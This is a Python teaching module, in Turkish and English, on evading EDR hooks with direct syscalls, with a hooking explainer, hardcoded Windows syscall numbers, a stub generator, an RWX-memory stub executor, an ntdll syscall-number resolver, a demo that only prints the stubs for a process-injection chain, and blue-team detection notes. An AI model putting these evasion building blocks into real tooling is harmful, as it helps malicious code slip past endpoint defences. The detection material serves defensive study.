"""
Evasion Technique: Direct Syscalls
===================================
EDR hooking'i bypass etmek için doğrudan syscall kullanımı.

MITRE ATT&CK: T1106 - Native API

Neden Gerekli:
- EDR'lar NTDLL fonksiyonlarını hook eder
- Hook: Fonksiyon başına JMP instruction eklenir
- Direct syscall bu hook'ları bypass eder

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import struct

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                      EVASION: DIRECT SYSCALLS                                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 USERLAND HOOKING NEDİR?                                                  ║
║  ───────────────────────────                                                 ║
║                                                                              ║
║  EDR/AV ürünleri, NTDLL.dll fonksiyonlarını "hook" eder:                    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                     NORMAL NTDLL FUNCTION                           │    ║
║  │                                                                     │    ║
║  │  NtAllocateVirtualMemory:                                           │    ║
║  │  ┌────────────────────────────────────────┐                        │    ║
║  │  │ 4C 8B D1          mov r10, rcx         │                        │    ║
║  │  │ B8 18 00 00 00    mov eax, 0x18        │ ◄── Syscall number     │    ║
║  │  │ 0F 05             syscall              │ ◄── Kernel'e geç       │    ║
║  │  │ C3                ret                  │                        │    ║
║  │  └────────────────────────────────────────┘                        │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                     HOOKED NTDLL FUNCTION                           │    ║
║  │                                                                     │    ║
║  │  NtAllocateVirtualMemory:                                           │    ║
║  │  ┌────────────────────────────────────────┐                        │    ║
║  │  │ E9 XX XX XX XX    jmp EDR_Hook         │ ◄── EDR hook!          │    ║
║  │  │ 90 90 90 90 90    nop nop nop...       │                        │    ║
║  │  │ 0F 05             syscall              │                        │    ║
║  │  │ C3                ret                  │                        │    ║
║  │  └────────────────────────────────────────┘                        │    ║
║  │           │                                                         │    ║
║  │           ▼                                                         │    ║
║  │  ┌────────────────────────────────────────┐                        │    ║
║  │  │ EDR_Hook:                              │                        │    ║
║  │  │   - Log parameters                     │                        │    ║
║  │  │   - Check for malicious patterns       │                        │    ║
║  │  │   - Allow/Block execution              │                        │    ║
║  │  │   - Jump back to original code         │                        │    ║
║  │  └────────────────────────────────────────┘                        │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  🔄 DIRECT SYSCALL ÇÖZÜMÜ:                                                   ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  Hook'ları bypass etmek için NTDLL'i kullanmadan doğrudan syscall yaparız:  ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                     DIRECT SYSCALL                                  │    ║
║  │                                                                     │    ║
║  │  ; NtAllocateVirtualMemory syscall stub                             │    ║
║  │  mov r10, rcx                                                       │    ║
║  │  mov eax, 0x18        ; Syscall number (Windows version dependent!) │    ║
║  │  syscall              ; Direct kernel call - NO HOOKS!              │    ║
║  │  ret                                                                │    ║
║  │                                                                     │    ║
║  │  Application ──────► Kernel (bypasses userland entirely)           │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ⚠️ ZORLUKLAR:                                                               ║
║  ──────────────                                                              ║
║  • Syscall numaraları Windows versiyonuna göre değişir                       ║
║  • Syscall stub'ları elle yazılmalı                                          ║
║  • x64 calling convention                                                    ║
║                                                                              ║
║  🛡️ TESPİT:                                                                  ║
║  ───────────                                                                 ║
║  • ETW: Microsoft-Windows-Threat-Intelligence (kernel level)                 ║
║  • Syscall pattern detection                                                 ║
║  • Call stack analysis (return address)                                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# SYSCALL NUMBERS (Windows 10/11 - değişebilir!)
# ============================================================================

# Bu numaralar Windows versiyonuna göre DEĞİŞİR!
# https://j00ru.vexillium.org/syscalls/nt/64/ adresinden güncel liste

SYSCALL_NUMBERS = {
    # Windows 10 21H2 / Windows 11
    "NtAllocateVirtualMemory": 0x18,
    "NtWriteVirtualMemory": 0x3A,
    "NtProtectVirtualMemory": 0x50,
    "NtCreateThreadEx": 0xC1,
    "NtOpenProcess": 0x26,
    "NtClose": 0x0F,
    "NtQuerySystemInformation": 0x36,
}

# ============================================================================
# SYSCALL STUB GENERATOR
# ============================================================================

def generate_syscall_stub(syscall_number: int) -> bytes:
    """
    x64 syscall stub oluştur.
    
    mov r10, rcx
    mov eax, <syscall_number>
    syscall
    ret
    
    Args:
        syscall_number: Syscall numarası
    
    Returns:
        bytes: Executable syscall stub
    """
    stub = bytearray()
    
    # mov r10, rcx (Windows x64 calling convention)
    stub += b"\x4C\x8B\xD1"
    
    # mov eax, syscall_number
    stub += b"\xB8"
    stub += struct.pack("<I", syscall_number)
    
    # syscall
    stub += b"\x0F\x05"
    
    # ret
    stub += b"\xC3"
    
    return bytes(stub)

def print_syscall_stub(name: str, number: int):
    """Syscall stub'ı yazdır"""
    stub = generate_syscall_stub(number)
    
    print(f"\n{name} (0x{number:02X}):")
    print(f"  Bytes: {' '.join(f'{b:02x}' for b in stub)}")
    print(f"  Assembly:")
    print(f"    mov r10, rcx")
    print(f"    mov eax, 0x{number:X}")
    print(f"    syscall")
    print(f"    ret")

# ============================================================================
# SYSCALL EXECUTOR (ctypes)
# ============================================================================

def create_syscall_function(syscall_number: int, argtypes: list, restype):
    """
    Çalıştırılabilir syscall fonksiyonu oluştur.
    
    Args:
        syscall_number: Syscall numarası
        argtypes: Argument types listesi
        restype: Return type
    
    Returns:
        Callable syscall function
    """
    from utils.win_api import VirtualAlloc, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE
    
    # Generate stub
    stub = generate_syscall_stub(syscall_number)
    
    # Allocate executable memory
    addr = VirtualAlloc(
        None,
        len(stub),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if not addr:
        raise Exception("VirtualAlloc failed")
    
    # Copy stub
    ctypes.memmove(addr, stub, len(stub))
    
    # Create function pointer
    func_type = ctypes.CFUNCTYPE(restype, *argtypes)
    func = func_type(addr)
    
    return func

# ============================================================================
# DIRECT SYSCALL INJECTION EXAMPLE
# ============================================================================

def direct_syscall_injection(shellcode: bytes, target_pid: int, verbose: bool = True) -> bool:
    """
    Direct syscall kullanarak injection yap.
    
    NTDLL fonksiyonları yerine doğrudan syscall kullanır.
    EDR userland hook'larını bypass eder.
    
    Args:
        shellcode: Çalıştırılacak shellcode
        target_pid: Hedef PID
        verbose: Detaylı çıktı
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print(TECHNIQUE_INFO)
        print(f"\n🎯 Direct Syscall Injection")
        print(f"   Target PID: {target_pid}")
        print("="*60)
    
    # Bu örnek konseptual - tam implementasyon için:
    # 1. Syscall numaralarını dinamik olarak çöz
    # 2. Her syscall için stub oluştur
    # 3. Doğru calling convention kullan
    
    if verbose:
        print("\n📋 Kullanılacak Syscall'lar:")
        for name, number in SYSCALL_NUMBERS.items():
            print(f"   {name}: 0x{number:02X}")
    
    # NtOpenProcess syscall stub
    if verbose:
        print("\n[1/4] NtOpenProcess (direct syscall)...")
        print_syscall_stub("NtOpenProcess", SYSCALL_NUMBERS["NtOpenProcess"])
    
    # NtAllocateVirtualMemory syscall stub
    if verbose:
        print("\n[2/4] NtAllocateVirtualMemory (direct syscall)...")
        print_syscall_stub("NtAllocateVirtualMemory", SYSCALL_NUMBERS["NtAllocateVirtualMemory"])
    
    # NtWriteVirtualMemory syscall stub
    if verbose:
        print("\n[3/4] NtWriteVirtualMemory (direct syscall)...")
        print_syscall_stub("NtWriteVirtualMemory", SYSCALL_NUMBERS["NtWriteVirtualMemory"])
    
    # NtCreateThreadEx syscall stub
    if verbose:
        print("\n[4/4] NtCreateThreadEx (direct syscall)...")
        print_syscall_stub("NtCreateThreadEx", SYSCALL_NUMBERS["NtCreateThreadEx"])
    
    if verbose:
        print("\n" + "="*60)
        print("⚠️ Bu demo sadece syscall stub'larını gösterir")
        print("   Tam implementasyon için assembly gerekir")
        print("="*60)
    
    return True

# ============================================================================
# INDIRECT SYSCALLS (More Stealthy)
# ============================================================================

INDIRECT_SYSCALL_INFO = """
📖 INDIRECT SYSCALLS

Direct syscall'dan daha stealth bir yöntem:
- Syscall instruction'ı NTDLL içindeki orijinal konumundan çalıştırır
- Call stack daha "normal" görünür
- Bazı EDR'ların syscall pattern detection'ını bypass eder

Çalışma prensibi:
1. NTDLL'deki orijinal syscall instruction adresini bul
2. Parametreleri hazırla
3. Syscall'a doğrudan değil, NTDLL içindeki adrese jump yap

Avantajları:
- Return address NTDLL içinde görünür
- Syscall instruction legitimate modülden çalışır
"""

# ============================================================================
# SYSCALL NUMBER RESOLVER
# ============================================================================

def resolve_syscall_number(function_name: str) -> int:
    """
    NTDLL'den syscall numarasını dinamik olarak çöz.
    
    Bu yöntem hardcoded numaralar yerine runtime'da çözer,
    farklı Windows versiyonlarında çalışır.
    
    Args:
        function_name: NTDLL fonksiyon adı (örn: "NtAllocateVirtualMemory")
    
    Returns:
        int: Syscall numarası
    """
    ntdll = ctypes.WinDLL('ntdll')
    
    try:
        # Fonksiyon adresini al
        func_addr = ctypes.cast(
            getattr(ntdll, function_name),
            ctypes.c_void_p
        ).value
        
        if not func_addr:
            return 0
        
        # Fonksiyonun ilk 20 byte'ını oku
        # mov eax, XX XX XX XX pattern'i ara
        func_bytes = ctypes.string_at(func_addr, 20)
        
        # Pattern: 4C 8B D1 B8 XX XX XX XX 0F 05
        # mov r10, rcx; mov eax, syscall_num; syscall
        
        for i in range(len(func_bytes) - 5):
            if func_bytes[i] == 0xB8:  # mov eax, imm32
                syscall_num = struct.unpack("<I", func_bytes[i+1:i+5])[0]
                return syscall_num
        
        return 0
        
    except Exception as e:
        print(f"Error resolving {function_name}: {e}")
        return 0

# ============================================================================
# DETECTION NOTES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 KERNEL TELEMETRY (ETW):                                                  ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  Provider: Microsoft-Windows-Threat-Intelligence                             ║
║  - EtwTiLogAllocateVirtualMemoryEx                                          ║
║  - EtwTiLogWriteVirtualMemory                                               ║
║  - EtwTiLogProtectVirtualMemory                                             ║
║                                                                              ║
║  Bu ETW provider'ı syscall seviyesinde çalışır!                             ║
║  Direct syscall bypass edemez.                                               ║
║                                                                              ║
║  📋 CALL STACK ANALYSIS:                                                     ║
║  ────────────────────────                                                    ║
║                                                                              ║
║  Normal call stack:                                                          ║
║    Application.exe!main                                                      ║
║    kernel32.dll!VirtualAlloc                                                 ║
║    ntdll.dll!NtAllocateVirtualMemory                                         ║
║    ntoskrnl.exe!NtAllocateVirtualMemory  ◄── Kernel                          ║
║                                                                              ║
║  Direct syscall call stack (ŞÜPHELİ!):                                       ║
║    Application.exe!main                                                      ║
║    Application.exe!syscall_stub          ◄── ntdll yok!                      ║
║    ntoskrnl.exe!NtAllocateVirtualMemory                                      ║
║                                                                              ║
║  📋 KQL DETECTION:                                                           ║
║  ─────────────────                                                           ║
║                                                                              ║
║  // Syscall from non-standard module                                         ║
║  DeviceEvents                                                                ║
║  | where ActionType contains "VirtualMemory"                                 ║
║  | extend CallStack = parse_json(AdditionalFields).CallStack                 ║
║  | where CallStack !contains "ntdll.dll"                                     ║
║                                                                              ║
║  📋 BEHAVIORAL INDICATORS:                                                   ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  • Syscall instruction executable private memory'den                         ║
║  • Return address ntdll dışında                                              ║
║  • Memory region with syscall opcodes (0F 05)                               ║
║  • Unusual API call patterns                                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    print("\n📋 Syscall Stub'ları:")
    print("="*60)
    
    for name, number in SYSCALL_NUMBERS.items():
        print_syscall_stub(name, number)
    
    print("\n" + "="*60)
    print("📋 Dinamik Syscall Resolution:")
    print("="*60)
    
    test_functions = [
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx"
    ]
    
    for func in test_functions:
        try:
            resolved = resolve_syscall_number(func)
            if resolved:
                print(f"   {func}: 0x{resolved:02X}")
            else:
                print(f"   {func}: Resolution failed")
        except:
            print(f"   {func}: Not found")
    
    print(INDIRECT_SYSCALL_INFO)
    print(DETECTION_RULES)
